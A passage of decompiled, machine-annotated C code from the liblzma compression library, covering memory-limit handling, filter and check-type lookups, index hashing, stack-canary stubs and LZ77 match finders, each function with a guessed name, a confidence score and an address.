 * @brief Calculates decoder memory usage including index, validates against limit, optionally updates limit.
 * @confidence 72%
 * @classification utility
 * @address 0x0010fa40
 */

/* Calculates memory usage for LZMA decoder, validates against a memory limit, and optionally
   updates the limit. Returns 0 on success, 6 if memory limit exceeded, 0xb on error. */

undefined8 lzma_decoder_memory_usage(int *param_1,ulong *param_2,undefined8 *param_3,ulong param_4)

{
  int iVar1;
  long lVar2;
  ulong uVar3;
  undefined8 uVar4;
  long in_FS_OFFSET;
  long local_48;
  undefined1 local_40 [8];
  undefined1 local_38 [8];
  long local_30;
  
  lVar2 = 0;
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  local_48 = 0;
  if (*(long *)(param_1 + 0x22) != 0) {
    lVar2 = lzma_index_memused();
  }
  if (*(long *)(param_1 + 0x1e) == 0) {
    if (*param_1 != 5) goto LAB_0010fa9d;
    iVar1 = (**(code **)(param_1 + 0x16))(*(undefined8 *)(param_1 + 8),&local_48,local_38,0);
    if (iVar1 == 0) {
      uVar3 = local_48 + lVar2;
      *param_2 = uVar3;
      goto joined_r0x0010fb2d;
    }
  }
  else {
    local_48 = lzma_index_memused();
LAB_0010fa9d:
    uVar3 = local_48 + lVar2;
    *param_2 = uVar3;
joined_r0x0010fb2d:
    if (uVar3 == 0) {
      uVar3 = lzma_index_memusage(1,0);
      *param_2 = uVar3;
    }
    *param_3 = *(undefined8 *)(param_1 + 0x28);
    uVar4 = 0;
    if ((param_4 == 0) || (uVar4 = 6, param_4 < *param_2)) goto LAB_0010fadb;
    if ((*(long *)(param_1 + 0x1e) != 0) ||
       ((*param_1 != 5 ||
        (iVar1 = (**(code **)(param_1 + 0x16))
                           (*(undefined8 *)(param_1 + 8),local_40,local_38,param_4 - lVar2),
        iVar1 == 0)))) {
      *(ulong *)(param_1 + 0x28) = param_4;
      uVar4 = 0;
      goto LAB_0010fadb;
    }
  }
  uVar4 = 0xb;
LAB_0010fadb:
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar4;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_decoder_find_by_id
 * @brief Searches decoder filter table (12 entries) for matching filter ID, returns descriptor
 * @confidence 85%
 * @classification utility
 * @address 0x00110560
 */

/* Searches decoder filter table (12 entries) for matching ID */

undefined * lzma_decoder_find_by_id(long param_1)

{
  long lVar1;
  long lVar2;
  long *plVar3;
  
  plVar3 = &decoder_filter_table;
  lVar1 = 0;
  lVar2 = 0x4000000000000001;
  while( true ) {
    if (param_1 == lVar2) {
      return &DAT_00131c20 + lVar1 * 0x20;
    }
    lVar1 = lVar1 + 1;
    if (lVar1 == 0xc) break;
    lVar2 = *plVar3;
    plVar3 = plVar3 + 4;
  }
  return (undefined *)0x0;
}



/**
 * @name  lzma_filter_decoder_is_supported
 * @brief Checks if filter ID exists in decoder filter table (12 entries)
 * @confidence 90%
 * @classification utility
 * @address 0x001105b0
 */

/* Checks if filter ID is in decoder filter table (12 entries) */

undefined8 lzma_filter_decoder_is_supported(long param_1)

{
  long lVar1;
  long lVar2;
  long *plVar3;
  
  plVar3 = &decoder_filter_table;
  lVar1 = 0;
  lVar2 = 0x4000000000000001;
  while( true ) {
    if (param_1 == lVar2) {
      return 1;
    }
    lVar1 = lVar1 + 1;
    if (lVar1 == 0xc) break;
    lVar2 = *plVar3;
    plVar3 = plVar3 + 4;
  }
  return 0;
}



/**
 * @name  lzma_raw_decoder_memusage
 * @brief Queries memory usage for raw LZMA decoding using decoder filter lookup
 * @confidence 85%
 * @classification utility
 * @address 0x001106a0
 */

/* Queries memory usage for raw LZMA decoding */

void lzma_raw_decoder_memusage(undefined8 param_1)

{
  FUN_00105fb0(lzma_decoder_find_by_id,param_1);
  return;
}



/**
 * @name  lzma_index_decoder_memconfig
 * @brief Gets/sets index decoder memory configuration using index memusage calculation
 * @confidence 80%
 * @classification utility
 * @address 0x00110800
 */

/* Gets/sets index decoder memory configuration */

undefined8
lzma_index_decoder_memconfig(long param_1,ulong *param_2,undefined8 *param_3,ulong param_4)

{
  ulong uVar1;
  undefined8 uVar2;
  
  uVar1 = lzma_index_memusage(1,*(undefined8 *)(param_1 + 0x20));
  *param_2 = uVar1;
  *param_3 = *(undefined8 *)(param_1 + 8);
  uVar2 = 0;
  if ((param_4 != 0) && (uVar2 = 6, *param_2 <= param_4)) {
    *(ulong *)(param_1 + 8) = param_4;
    uVar2 = 0;
  }
  return uVar2;
}



/**
 * @name  get_base_pointer
 * @brief Returns EBP register value, error code passthrough
 * @confidence 25%
 * @classification utility
 * @address 0x00110987
 */

/* Returns the EBP register value, used as error code passthrough */

undefined4 get_base_pointer(void)

{
  undefined4 unaff_EBP;
  
  return unaff_EBP;
}



/**
 * @name  lzma_index_hash_record_update
 * @brief Updates index hash record statistics by accumulating VLI-encoded values and computing check hash.
 * @confidence 72%
 * @classification utility
 * @address 0x00110e80
 */

/* Updates block size statistics by accumulating VLI-encoded values. Calculates VLI encoding sizes,
   updates counters, and encodes data for further processing. */

void lzma_vli_update_block_size(long *param_1,long param_2,long param_3)

{
  int iVar1;
  int iVar2;
  long in_FS_OFFSET;
  long local_48;
  long local_40;
  long local_30;
  
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  param_1[1] = param_1[1] + param_3;
  *param_1 = *param_1 + (param_2 + 3U & 0xfffffffffffffffc);
  iVar1 = lzma_vli_size(param_2);
  iVar2 = lzma_vli_size(param_3);
  param_1[2] = param_1[2] + 1;
  param_1[3] = param_1[3] + (ulong)(uint)(iVar2 + iVar1);
  local_48 = param_2;
  local_40 = param_3;
  update_checksum(param_1 + 4,10,&local_48,0x10);
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_index_hash_size
 * @brief Calculates total index hash size with VLI encoding and 4-byte alignment
 * @confidence 85%
 * @classification utility
 * @address 0x00111000
 */

/* Calculates total index hash size with VLI encoding and 4-byte alignment */

ulong lzma_index_hash_size(long param_1)

{
  int iVar1;
  
  iVar1 = lzma_vli_size(*(undefined8 *)(param_1 + 0x18));
  return *(long *)(param_1 + 0x20) + 7 + (ulong)(iVar1 + 1) & 0xfffffffffffffffc;
}



/**
 * @name  lzma_index_hash_append
 * @brief Appends block info to index hash, validates sizes, updates VLI block size counters.
 * @confidence 85%
 * @classification utility
 * @address 0x00111030
 */

/* Appends block info to index hash, validates sizes */

undefined4 lzma_index_hash_append(int *param_1,long param_2,long param_3)

{
  long lVar1;
  undefined4 uVar2;
  int iVar3;
  ulong uVar4;
  
  if ((((param_1 != (int *)0x0) && (*param_1 == 0)) && (param_2 - 5U < 0x7ffffffffffffff8)) &&
     (-1 < param_3)) {
    lzma_vli_update_block_size(param_1 + 2);
    lVar1 = *(long *)(param_1 + 2);
    if ((-1 < lVar1) && (-1 < *(long *)(param_1 + 4))) {
      iVar3 = lzma_vli_size(*(undefined8 *)(param_1 + 6));
      uVar4 = *(long *)(param_1 + 8) + 7 + (ulong)(iVar3 + 1) & 0xfffffffffffffffc;
      if (uVar4 < 0x400000001) {
        uVar2 = 0;
        if ((long)(lVar1 + 0x18 + uVar4) < 0) {
          uVar2 = 9;
        }
        return uVar2;
      }
    }
    return 9;
  }
  return 0xb;
}



/**
 * @name  get_r11d_register
 * @brief Returns the R11D register value, likely an error code passthrough in a tail position
 * @confidence 30%
 * @classification utility
 * @address 0x001111a1
 */

/* Returns R11D register value, likely error code passthrough */

undefined4 get_r11d_register(void)

{
  undefined4 in_R11D;
  
  return in_R11D;
}



/**
 * @name  lzma_stream_decoder_memconfig
 * @brief Gets/sets stream decoder memory limit at offsets 0x168 and 0x170
 * @confidence 80%
 * @classification utility
 * @address 0x001116a0
 */

/* Gets/sets memory check and limit from stream decoder state */

undefined8
lzma_stream_decoder_get_check_memlimit
          (long param_1,undefined8 *param_2,undefined8 *param_3,ulong param_4)

{
  undefined8 uVar1;
  
  *param_2 = *(undefined8 *)(param_1 + 0x170);
  *param_3 = *(undefined8 *)(param_1 + 0x168);
  uVar1 = 0;
  if ((param_4 != 0) && (uVar1 = 6, *(ulong *)(param_1 + 0x170) <= param_4)) {
    *(ulong *)(param_1 + 0x168) = param_4;
    uVar1 = 0;
  }
  return uVar1;
}



/**
 * @name  stack_check_guard
 * @brief Stack canary validation - calls __stack_chk_fail on mismatch
 * @confidence 90%
 * @classification utility
 * @address 0x00111bf0
 */

/* Stack canary validation function */

void stack_check_guard(void)

{
  long in_FS_OFFSET;
  long in_stack_000000b8;
  
  if (in_stack_000000b8 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_stream_decoder_mt_get_progress
 * @brief Collects progress from MT decoder by summing per-worker in/out byte counts under mutex protection.
 * @confidence 72%
 * @classification utility
 * @address 0x00112130
 */

void FUN_00112130(long param_1,long *param_2,long *param_3)

{
  long lVar1;
  long lVar2;
  ulong uVar3;
  
  pthread_mutex_lock((pthread_mutex_t *)(param_1 + 0x228));
  *param_2 = *(long *)(param_1 + 0x2c8);
  *param_3 = *(long *)(param_1 + 0x2d0);
  if (*(int *)(param_1 + 0x1c8) != 0) {
    lVar2 = 0;
    uVar3 = 0;
    do {
      uVar3 = uVar3 + 1;
      pthread_mutex_lock((pthread_mutex_t *)(*(long *)(param_1 + 0x1d0) + lVar2 + 400));
      lVar1 = *(long *)(param_1 + 0x1d0) + lVar2;
      lVar2 = lVar2 + 0x1f8;
      *param_2 = *param_2 + *(long *)(lVar1 + 0x48);
      *param_3 = *param_3 + *(long *)(lVar1 + 0x50);
      pthread_mutex_unlock((pthread_mutex_t *)(lVar1 + 400));
    } while (uVar3 < *(uint *)(param_1 + 0x1c8));
  }
  pthread_mutex_unlock((pthread_mutex_t *)(param_1 + 0x228));
  return;
}



/**
 * @name  lzma_stream_decoder_mt_memconfig
 * @brief Queries/sets memory configuration for MT decoder. Sums buffer sizes, enforces minimum 0x8000.
 * @confidence 72%
 * @classification utility
 * @address 0x001121f0
 */

/* Calculates a total buffer size from multiple fields in a context structure by summing offset
   values, enforces a minimum size of 0x8000, retrieves a previous value, and conditionally updates
   a field if a parameter constraint is met. */

undefined8
calculate_buffer_size_and_validate(long param_1,ulong *param_2,undefined8 *param_3,ulong param_4)

{
  undefined8 uVar1;
  
  pthread_mutex_lock((pthread_mutex_t *)(param_1 + 0x228));
  *param_2 = *(long *)(param_1 + 0x2a0) + *(long *)(param_1 + 0x298) + *(long *)(param_1 + 0x2a8) +
             *(long *)(param_1 + 0x208);
  pthread_mutex_unlock((pthread_mutex_t *)(param_1 + 0x228));
  if (*param_2 < 0x8000) {
    *param_2 = 0x8000;
  }
  *param_3 = *(undefined8 *)(param_1 + 0x290);
  uVar1 = 0;
  if ((param_4 != 0) && (uVar1 = 6, *param_2 <= param_4)) {
    *(ulong *)(param_1 + 0x290) = param_4;
    uVar1 = 0;
  }
  return uVar1;
}



/**
 * @name  stack_check_guard_1
 * @brief Stack canary validation - calls __stack_chk_fail on mismatch
 * @confidence 90%
 * @classification utility
 * @address 0x0011317a
 */

/* Stack canary validation function */

void stack_check_guard_1(void)

{
  long in_FS_OFFSET;
  long in_stack_000001b8;
  
  if (in_stack_000001b8 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_lzip_decoder_memconfig
 * @brief Gets/sets memory usage and limit from lzip decoder state
 * @confidence 75%
 * @classification utility
 * @address 0x001144c0
 */

/* Gets/sets memory usage and limit from lzip decoder */

undefined8 lzma_vli_get(long param_1,undefined8 *param_2,undefined8 *param_3,ulong param_4)

{
  undefined8 uVar1;
  
  *param_2 = *(undefined8 *)(param_1 + 0x28);
  *param_3 = *(undefined8 *)(param_1 + 0x20);
  uVar1 = 0;
  if ((param_4 != 0) && (uVar1 = 6, *(ulong *)(param_1 + 0x28) <= param_4)) {
    *(ulong *)(param_1 + 0x20) = param_4;
    uVar1 = 0;
  }
  return uVar1;
}



/**
 * @name  stack_check_return
 * @brief Stack canary verification with passthrough return value
 * @confidence 85%
 * @classification utility
 * @address 0x001148c9
 */

/* Stack canary verification and return */

undefined4 stack_check_return(void)

{
  undefined4 in_R8D;
  long in_FS_OFFSET;
  long in_stack_00000058;
  
  if (in_stack_00000058 == *(long *)(in_FS_OFFSET + 0x28)) {
    return in_R8D;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_check_is_supported
 * @brief Checks if LZMA integrity check type is supported via lookup table
 * @confidence 95%
 * @classification utility
 * @address 0x00114ad0
 */

/* Checks if LZMA check type ID is supported via lookup table */

undefined1 lzma_check_is_supported(uint param_1)

{
  undefined1 uVar1;
  
  uVar1 = 0;
  if (param_1 < 0x10) {
    uVar1 = (&DAT_00124a40)[param_1];
  }
  return uVar1;
}



/**
 * @name  lzma_check_size
 * @brief Returns byte size of LZMA integrity check type from lookup table
 * @confidence 95%
 * @classification utility
 * @address 0x00114af0
 */

/* Returns size in bytes of an LZMA check type via lookup table */

ulong lzma_check_size(uint param_1)

{
  ulong uVar1;
  
  uVar1 = 0xffffffff;
  if (param_1 < 0x10) {
    uVar1 = (ulong)(byte)(&DAT_00124a30)[param_1];
  }
  return uVar1;
}



/**
 * @name  lzma_lzma_encoder_get_check
 * @brief Delegates get_check to sub-coder if encoder is not in LZMA2 uncompressed mode
 * @confidence 70%
 * @classification utility
 * @address 0x001168b0
 */

/* Calls function pointer at coder[4] if coder[0x17]==0 */

undefined8 lzma_lzma_encoder_get_check(undefined8 *param_1)

{
  undefined8 uVar1;
  
  if ((param_1[0x17] == 0) && ((code *)param_1[4] != (code *)0x0)) {
                    /* WARNING: Could not recover jumptable at 0x001168d4. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    uVar1 = (*(code *)param_1[4])(*param_1);
    return uVar1;
  }
  return 8;
}



/**
 * @name  lzma_lzma_encoder_memusage_preset
 * @brief Calculates encoder memory usage for a given preset by building temp options and calling size calculator.
 * @confidence 80%
 * @classification utility
 * @address 0x00116c60
 */

/* Calculates required memory size for LZMA encoder based on preset parameters */

long lzma_lzma_preset_encoder_get_size(undefined8 param_1)

{
  char cVar1;
  long lVar2;
  undefined8 *puVar3;
  long in_FS_OFFSET;
  undefined8 uStack_88;
  uint local_80;
  uint local_1c;
  uint local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puVar3 = &uStack_88;
  for (lVar2 = 0xf; lVar2 != 0; lVar2 = lVar2 - 1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  cVar1 = lzma_stream_init_state(&uStack_88,0,param_1);
  lVar2 = -1;
  if (cVar1 == '\0') {
    lVar2 = (ulong)local_80 + 0xf0 + ((ulong)local_1c + (ulong)local_18) * 4;
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return lVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_mf_is_supported
 * @brief Checks if match finder type is supported: HC3(3), HC4(4), BT2(18), BT3(19), BT4(20)
 * @confidence 90%
 * @classification utility
 * @address 0x00116fa0
 */

/* Checks if match finder type 3-4 or 18-20 is supported */

bool lzma_mf_is_supported(uint param_1)

{
  if (param_1 < 5) {
    return 2 < param_1;
  }
  return param_1 - 0x12 < 3;
}



/**
 * @name  lz_find_matches_bt
 * @brief Binary tree based LZ77 match finder. Traverses binary tree to find longest matches in sliding window using 8-byte word comparisons with trailing zero counting for fast length computation. Updates tree nodes during search.
 * @confidence 88%
 * @classification utility
 * @address 0x00117100
 */

/* Binary tree based LZ77 match finder. Searches for longest matches in a sliding window by
   traversing a binary tree. Compares bytes using 8-byte word comparisons with trailing zero
   counting for fast length computation. Updates tree nodes as it searches. */

uint * lz_find_matches_bt(uint param_1,int param_2,long param_3,int param_4,int param_5,long param_6
                         ,uint param_7,uint param_8,uint *param_9,uint param_10)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  long lVar5;
  byte bVar6;
  uint uVar7;
  ulong uVar8;
  byte bVar9;
  uint uVar10;
  uint uVar11;
  int *piVar12;
  int *local_50;
  uint *local_40;
  
  lVar5 = (ulong)(param_7 * 2) * 4 + 4;
  uVar4 = param_2 - param_4;
  piVar12 = (int *)(param_6 + lVar5);
  local_50 = (int *)(param_6 - 4 + lVar5);
  if ((uVar4 < param_8) && (param_5 != 0)) {
    uVar11 = 0;
    uVar10 = 0;
    local_40 = param_9;
    do {
      param_5 = param_5 - 1;
      iVar2 = (param_7 - param_2) + param_4;
      if (param_7 < uVar4) {
        iVar2 = iVar2 + param_8;
      }
      piVar1 = (int *)(param_6 + (ulong)(uint)(iVar2 * 2) * 4);
      lVar5 = param_3 - (ulong)uVar4;
      uVar3 = uVar11;
      if (uVar10 <= uVar11) {
        uVar3 = uVar10;
      }
      bVar9 = *(byte *)(lVar5 + (ulong)uVar3);
      bVar6 = *(byte *)(param_3 + (ulong)uVar3);
      if (bVar9 == bVar6) {
        uVar3 = uVar3 + 1;
        if (uVar3 < param_1) {
LAB_0011720f:
          uVar8 = *(long *)(lVar5 + (ulong)uVar3) - *(long *)(param_3 + (ulong)uVar3);
          if (uVar8 == 0) goto LAB_00117208;
          uVar7 = 0;
          for (; (uVar8 & 1) == 0; uVar8 = uVar8 >> 1 | 0x8000000000000000) {
            uVar7 = uVar7 + 1;
          }
          uVar7 = (uVar7 >> 3) + uVar3;
          uVar3 = uVar7;
          if (param_1 <= uVar7) {
            uVar3 = param_1;
          }
          if (param_10 < uVar3) {
            *local_40 = uVar3;
            local_40[1] = uVar4 - 1;
            if (param_1 <= uVar7) goto LAB_001172d8;
            bVar9 = *(byte *)(lVar5 + (ulong)uVar3);
            bVar6 = *(byte *)(param_3 + (ulong)uVar3);
            param_10 = uVar3;
            local_40 = local_40 + 2;
          }
          else {
            bVar9 = *(byte *)(lVar5 + (ulong)uVar3);
            bVar6 = *(byte *)(param_3 + (ulong)uVar3);
          }
          goto LAB_001171e0;
        }
LAB_00117278:
        if (param_10 < param_1) {
          *local_40 = param_1;
          local_40[1] = uVar4 - 1;
LAB_001172d8:
          local_40 = local_40 + 2;
          *local_50 = *piVar1;
          *piVar12 = piVar1[1];
          return local_40;
        }
        bVar9 = *(byte *)(lVar5 + (ulong)param_1);
        bVar6 = *(byte *)(param_3 + (ulong)param_1);
        uVar3 = param_1;
      }
LAB_001171e0:
      if (bVar9 < bVar6) {
        *local_50 = param_4;
        local_50 = piVar1 + 1;
        param_4 = piVar1[1];
        uVar11 = uVar3;
      }
      else {
        *piVar12 = param_4;
        param_4 = *piVar1;
        piVar12 = piVar1;
        uVar10 = uVar3;
      }
      uVar4 = param_2 - param_4;
    } while (param_5 != 0 && uVar4 < param_8);
  }
  else {
    local_40 = param_9;
  }
  *piVar12 = 0;
  *local_50 = 0;
  return local_40;
LAB_00117208:
  uVar3 = uVar3 + 8;
  if (param_1 <= uVar3) goto LAB_00117278;
  goto LAB_0011720f;
}



/**
 * @name  lzma_mf_normalize
 * @brief Normalizes match finder hash tables: rotates counter, conditionally decrements hash chain values when counter wraps.
 * @confidence 75%
 * @classification utility
 * @address 0x00117460
 */

/* Updates model or state machine by rotating a counter, checking bounds, and conditionally
   decrementing values in two fixed-size arrays based on a computed delta. */

void update_model_state(long param_1)

{
  uint *puVar1;
  uint uVar2;
  long lVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  uint uVar7;
  
  uVar4 = *(int *)(param_1 + 0x50) + 1;
  if (uVar4 == *(uint *)(param_1 + 0x54)) {
    uVar4 = 0;
  }
  *(uint *)(param_1 + 0x50) = uVar4;
  iVar5 = *(int *)(param_1 + 0x18) + 1;
  *(int *)(param_1 + 0x18) = iVar5;
  if (iVar5 + *(int *)(param_1 + 0x14) != -1) {
    return;
  }
  uVar4 = ~*(uint *)(param_1 + 0x54);
  if (*(int *)(param_1 + 0x6c) != 0) {
    lVar3 = *(long *)(param_1 + 0x40);
    uVar7 = 0;
    do {
      puVar1 = (uint *)(lVar3 + (ulong)uVar7 * 4);
      uVar2 = *puVar1;
      uVar6 = uVar2 - uVar4;
      if (uVar2 <= uVar4) {
        uVar6 = 0;
      }
      uVar7 = uVar7 + 1;
      *puVar1 = uVar6;
    } while (uVar7 < *(uint *)(param_1 + 0x6c));
  }
  if (*(int *)(param_1 + 0x70) != 0) {
    lVar3 = *(long *)(param_1 + 0x48);
    uVar7 = 0;
    do {
      puVar1 = (uint *)(lVar3 + (ulong)uVar7 * 4);
      uVar2 = *puVar1;
      uVar6 = uVar2 - uVar4;
      if (uVar2 <= uVar4) {
        uVar6 = 0;
      }
      uVar7 = uVar7 + 1;
      *puVar1 = uVar6;
    } while (uVar7 < *(uint *)(param_1 + 0x70));
  }
  *(int *)(param_1 + 0x14) = *(int *)(param_1 + 0x14) - uVar4;
  return;
}



/**
 * @name  lzma_mf_find_best_match
 * @brief Calculates best match distance in LZ77 by comparing data bytes at offsets and computing bit differences.
 * @confidence 65%
 * @classification utility
 * @address 0x00117510
 */

/* Calculates match distance in LZ77 decompression by comparing data bytes at different offsets and
   computing bit differences. Returns accumulated distance value. */

ulong lzma_range_match_distance(long *param_1,int *param_2,long param_3)

{
  long lVar1;
  uint *puVar2;
  int iVar3;
  ulong uVar4;
  uint uVar5;
  ulong uVar6;
  uint uVar7;
  
  iVar3 = (*(code *)param_1[6])(param_1,param_3);
  uVar4 = 0;
  if (iVar3 != 0) {
    puVar2 = (uint *)(param_3 + (ulong)(iVar3 - 1) * 8);
    uVar5 = *puVar2;
    uVar4 = (ulong)uVar5;
    if (*(uint *)(param_1 + 0xc) == uVar5) {
      uVar7 = (*(int *)((long)param_1 + 0x24) + 1) - *(uint *)(param_1 + 3);
      if (*(uint *)((long)param_1 + 100) <= uVar7) {
        uVar7 = *(uint *)((long)param_1 + 100);
      }
      lVar1 = *param_1 - 1 + (ulong)*(uint *)(param_1 + 3);
      if (uVar5 < uVar7) {
        do {
          uVar6 = *(long *)(lVar1 + uVar4) - *(long *)(lVar1 + ~(ulong)puVar2[1] + uVar4);
          if (uVar6 != 0) {
            uVar5 = 0;
            for (; (uVar6 & 1) == 0; uVar6 = uVar6 >> 1 | 0x8000000000000000) {
              uVar5 = uVar5 + 1;
            }
            uVar5 = (uVar5 >> 3) + (int)uVar4;
            if (uVar5 <= uVar7) {
              uVar7 = uVar5;
            }
            uVar4 = (ulong)uVar7;
            goto LAB_0011753e;
          }
          uVar5 = (int)uVar4 + 8;
          uVar4 = (ulong)uVar5;
        } while (uVar5 < uVar7);
      }
      uVar4 = (ulong)uVar7;
    }
  }
LAB_0011753e:
  *param_2 = iVar3;
  *(int *)((long)param_1 + 0x1c) = *(int *)((long)param_1 + 0x1c) + 1;
  return uVar4;
}



/**
 * @name  lzma_mf_hc3_find
 * @brief HC3 match finder: computes 2-byte and 3-byte hashes, searches hash chains, returns matches found.
 * @confidence 78%
 * @classification utility
 * @address 0x001175c0
 */

/* LZ77 match finder. Uses hash chains (2-byte and 3-byte hashes) to find matches in the sliding
   window. Performs quick check for 2-byte hash match, then extends using 8-byte comparisons with
   bit scanning (ctz). Returns number of matches found. Delegates to lz77_find_matches for deeper
   search. */

ulong lz_find_match(long *param_1,uint *param_2)

{
  int *piVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  long lVar7;
  ulong uVar8;
  ulong uVar9;
  byte *pbVar10;
  int iVar11;
  uint uVar12;
  
  uVar12 = *(uint *)(param_1 + 3);
  uVar5 = *(int *)((long)param_1 + 0x24) - uVar12;
  uVar4 = *(uint *)(param_1 + 0xc);
  if ((uVar5 < *(uint *)(param_1 + 0xc)) && (uVar4 = uVar5, uVar5 < 3)) {
    *(int *)(param_1 + 5) = (int)param_1[5] + 1;
    *(uint *)(param_1 + 3) = uVar12 + 1;
    return 0;
  }
  pbVar10 = (byte *)((ulong)uVar12 + *param_1);
  iVar11 = uVar12 + *(int *)((long)param_1 + 0x14);
  piVar1 = (int *)(param_1[8] +
                  (ulong)(((uint)pbVar10[1] ^ *(uint *)(&crc32_lookup_table + (ulong)*pbVar10 * 4)) &
                         0x3ff) * 4);
  uVar12 = iVar11 - *piVar1;
  piVar2 = (int *)(param_1[8] +
                  (ulong)((((uint)pbVar10[2] << 8 ^
                           (uint)pbVar10[1] ^ *(uint *)(&crc32_lookup_table + (ulong)*pbVar10 * 4)) &
                          *(uint *)(param_1 + 0xb)) + 0x400) * 4);
  iVar3 = *piVar2;
  *piVar1 = iVar11;
  *piVar2 = iVar11;
  if (uVar12 < *(uint *)((long)param_1 + 0x54)) {
    uVar9 = 2;
    if (pbVar10[-(ulong)uVar12] == *pbVar10) {
      if (2 < uVar4) {
LAB_001176b7:
        uVar8 = *(long *)(pbVar10 + (uVar9 - uVar12)) - *(long *)(pbVar10 + uVar9);
        if (uVar8 == 0) goto LAB_001176b0;
        uVar5 = 0;
        for (; (uVar8 & 1) == 0; uVar8 = uVar8 >> 1 | 0x8000000000000000) {
          uVar5 = uVar5 + 1;
        }
        uVar6 = (uVar5 >> 3) + (int)uVar9;
        uVar5 = uVar6;
        if (uVar4 <= uVar6) {
          uVar5 = uVar4;
        }
        param_2[1] = uVar12 - 1;
        *param_2 = uVar5;
        if (uVar4 <= uVar6) goto LAB_0011771a;
        goto LAB_0011765b;
      }
LAB_00117710:
      *param_2 = uVar4;
      param_2[1] = uVar12 - 1;
LAB_0011771a:
      *(int *)(param_1[9] + (ulong)*(uint *)(param_1 + 10) * 4) = iVar3;
      update_model_state(param_1);
      uVar9 = 1;
      goto LAB_00117689;
    }
  }
LAB_0011765b:
  lVar7 = lz77_find_matches();
  uVar9 = lVar7 - (long)param_2 >> 3;
  update_model_state(param_1);
LAB_00117689:
  return uVar9 & 0xffffffff;
LAB_001176b0:
  uVar5 = (int)uVar9 + 8;
  uVar9 = (ulong)uVar5;
  if (uVar4 <= uVar5) goto LAB_00117710;
  goto LAB_001176b7;
}



/**
 * @name  lzma_mf_hc3_skip
 * @brief HC3 hash chain skip: updates hash entries for count positions without searching for matches.
 * @confidence 70%
 * @classification utility
 * @address 0x00117740
 */

/* Updates LZ77 hash chain data structure during compression. Iterates count times, updating hash
   table entries and match pointers for each position. */

void lz77_match_update_hash_chain(long *param_1,int param_2)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  byte *pbVar5;
  undefined *puVar6;
  
  puVar6 = &crc32_lookup_table;
  do {
    while (uVar2 = *(uint *)(param_1 + 3), 2 < *(int *)((long)param_1 + 0x24) - uVar2) {
      pbVar5 = (byte *)((ulong)uVar2 + *param_1);
      iVar4 = uVar2 + *(int *)((long)param_1 + 0x14);
      piVar1 = (int *)(param_1[8] +
                      (ulong)((((uint)pbVar5[2] << 8 ^
                               (uint)pbVar5[1] ^ *(uint *)(puVar6 + (ulong)*pbVar5 * 4)) &
                              *(uint *)(param_1 + 0xb)) + 0x400) * 4);
      iVar3 = *piVar1;
      *(int *)(param_1[8] +
              (ulong)(((uint)pbVar5[1] ^ *(uint *)(puVar6 + (ulong)*pbVar5 * 4)) & 0x3ff) * 4) =
           iVar4;
      *piVar1 = iVar4;
      *(int *)(param_1[9] + (ulong)*(uint *)(param_1 + 10) * 4) = iVar3;
      update_model_state();
      param_2 = param_2 - 1;
      if (param_2 == 0) {
        return;
      }
    }
    *(int *)(param_1 + 5) = (int)param_1[5] + 1;
    *(uint *)(param_1 + 3) = uVar2 + 1;
    param_2 = param_2 - 1;
  } while (param_2 != 0);
  return;
}



/**
 * @name  lzma_mf_hc4_find
 * @brief Fast hash chain match finder using 2/3/4-byte hash tables. Updates hash entries, checks short matches via hash2/hash3, delegates longer matches to lz77_find_matches. Returns match count.
 * @confidence 80%
 * @classification utility
 * @address 0x001177c0
 */

/* Fast match finder for LZMA compression. Uses hash chains with 2-byte, 3-byte, and 4-byte hash
   tables to find string matches in the dictionary. Updates hash entries, checks for short matches
   (len 2-3) via hash2/hash3 tables, then delegates longer match finding to lz77_find_matches.
   Returns number of matches found. */

ulong lzma_find_matches_fast(long *param_1,uint *param_2)

{
  int *piVar1;
  int *piVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  long lVar10;
  uint *puVar11;
  ulong uVar12;
  uint uVar13;
  ulong uVar14;
  int iVar15;
  byte *pbVar16;
  ulong uVar17;
  ulong uVar18;
  
  uVar9 = *(uint *)(param_1 + 3);
  uVar8 = *(int *)((long)param_1 + 0x24) - uVar9;
  uVar7 = *(uint *)(param_1 + 0xc);
  if ((uVar8 < *(uint *)(param_1 + 0xc)) && (uVar7 = uVar8, uVar8 < 4)) {
    *(int *)(param_1 + 5) = (int)param_1[5] + 1;
    *(uint *)(param_1 + 3) = uVar9 + 1;
    return 0;
  }
  pbVar16 = (byte *)((ulong)uVar9 + *param_1);
  iVar15 = uVar9 + *(int *)((long)param_1 + 0x14);
  lVar10 = param_1[8];
  uVar9 = (uint)pbVar16[2] << 8 ^ (uint)pbVar16[1] ^ *(uint *)(&crc32_lookup_table + (ulong)*pbVar16 * 4);
  piVar1 = (int *)(lVar10 + (ulong)(((uint)pbVar16[1] ^
                                    *(uint *)(&crc32_lookup_table + (ulong)*pbVar16 * 4)) & 0x3ff) * 4);
  piVar3 = (int *)(lVar10 + 0x1000 + (ulong)(uVar9 & 0xffff) * 4);
  iVar4 = *piVar1;
  iVar5 = *piVar3;
  uVar13 = iVar15 - iVar4;
  uVar8 = iVar15 - iVar5;
